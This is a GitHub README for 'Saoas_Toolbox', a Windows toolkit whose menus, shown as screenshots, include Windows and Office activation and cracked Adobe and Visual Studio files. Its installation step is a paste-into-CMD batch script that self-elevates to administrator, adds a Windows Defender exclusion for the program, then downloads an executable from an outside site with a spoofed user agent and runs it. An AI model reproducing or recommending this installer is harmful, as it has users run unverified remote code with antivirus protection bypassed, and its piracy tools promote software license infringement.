# Saoas_Toolbox
 - **Installation:**
   - Run this Command in CMD! or download it [here](https://links.saoas.tv/Toolbox/Saoas_Toolbox.cmd)
```
@echo off
<!-- : --- Self-elevating.bat ---------------------------------------
whoami /groups | find "S-1-16-12288" > nul && goto :ELEVATED
echo Requesting administrative privileges...
set "ELEVATE_CMDLINE=cd /d "%cd%" & call "%~f0" %*"
cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b

-->
<job id="Elevate"><script language="VBScript">
  Set objShell = CreateObject("Shell.Application")
  Set objWshShell = WScript.CreateObject("WScript.Shell")
  Set objWshProcessEnv = objWshShell.Environment("PROCESS")
  strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
  objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
</script></job>
:ELEVATED -----------------------------------------------------------

powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
cd /d "%USERPROFILE%/Desktop/"
wget -q --show-progress --user-agent="chrome" --no-hsts "https://links.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
Saoas_Toolbox.exe
```

#####


![Saoas Toolbox Main Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/dbcb3a42-5285-4d69-a21f-4c29c61c15ab)


![Saoas Tools Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/35a5f07d-590e-4024-a07e-ce7ffd9386c9)


![Runtimes Frameworks Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/e2f3a1d4-667a-47fd-9825-7c7680c8448c)


![Programm files Menu 1of2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/02cebc8c-ff2a-49cd-ad3d-223c7ba1da4d)


![Programm files Menu 2of2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/5c9fb0e4-ce8c-4d40-8ce2-f7080b2bbec6)


![Internet Browsers Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/ff08cc32-7aa2-4cc5-b77e-0b46f06c8e19)


![Windows Tweaks Main Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/50a8410f-17b8-41dd-98b8-357d9c5cb7fb)


![Windows Context Tweaks Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/a9939d29-fdc8-4e0b-8144-880fe2d5b6b7)


![Windows Tweaks Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/8527b18e-cdcd-4f75-a34d-8e3ba888b51d)


![Windows Install and Activation Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/603613bd-ef29-4922-b022-03fe9e434128)


![Office Install and Activation Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/09265b54-eaf3-4a26-abc3-a56f5d415894)


![Cracked Files Main Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/50452122-a3b6-4cba-a072-1d4e1b7cc923)


![Cracked Adobe Files Menu 1 of 2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/af39f97a-e5df-4b6e-af73-09b9433ff631)


![Cracked Adobe Files Menu 2 of 2](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/a0e89f09-b7db-494f-b3d1-89a2be74b3c0)


![Cracked Microsoft Visual Studio Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/9716dbee-dd25-44ac-8673-507f6a518525)


![Microsoft Visual Studio 2022 Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/023292eb-3f3a-471d-8084-e3025add3547)


![Packet Managers Menu](https://github.com/SaoasBlubb/Saoas_Toolbox/assets/56938581/ad735b1f-06d3-44b8-a374-77750a0d5ba0)
